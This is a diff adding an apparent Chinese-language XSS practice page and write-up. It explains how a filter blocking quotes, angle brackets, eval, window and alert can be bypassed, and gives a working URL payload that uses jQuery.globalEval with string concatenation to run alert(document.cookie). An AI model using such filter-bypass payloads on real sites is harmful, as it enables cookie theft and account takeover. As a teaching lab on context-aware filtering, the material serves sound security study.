@@ -1,0 +1,26 @@
+<style>
+.code{border:1px solid #ccc;background:#ffff77;padding:10px;}
+</style>
+<pre>
+<div class="code" id="test">
+<a href="javascript:void(0);">这里只是测试用的链接..</a>
+<a href="javascript:void(0);">这里只是测试用的链接..</a>
+<a href="javascript:void(0);">这里只是测试用的链接..</a>
+</div>
+<script src="../jq.js"></script>
+<script name="对面的妹子，看过来，看过来，看过来...">
+try{
+    var page='1';
+    var b=document.cookie;
+}catch(e){
+ 
+}
+</script>
+过滤了：
+”, <, >, eval, window, alert
+
+这里的上下文又不同，alert和eval都不能用了，怎么办呢，我们可以看到在页面中引入了jquery，那么应该可以从jquery带的函数下手吧，然后再通过字符串拼接来绕过对于alert的过滤，使用下面的方法来绕：
+
+http://xsst.sinaapp.com/example/test1-2-3.php?page=’%2bjQuery.globalEval(‘a’%2b’lert’%2b’(document.cookie)’)%2b’
+
+用到了jQuery.globalEval来做执行，绕过了限制。因此，在XSS的过滤中，上下文确实非常重要，如果没有对于上下文正确的理解，很难做出正确的过滤。看来熟悉Javascript还是非常有用的，准备迟点好好看看Javascript，也可以用来改造博客什么的。
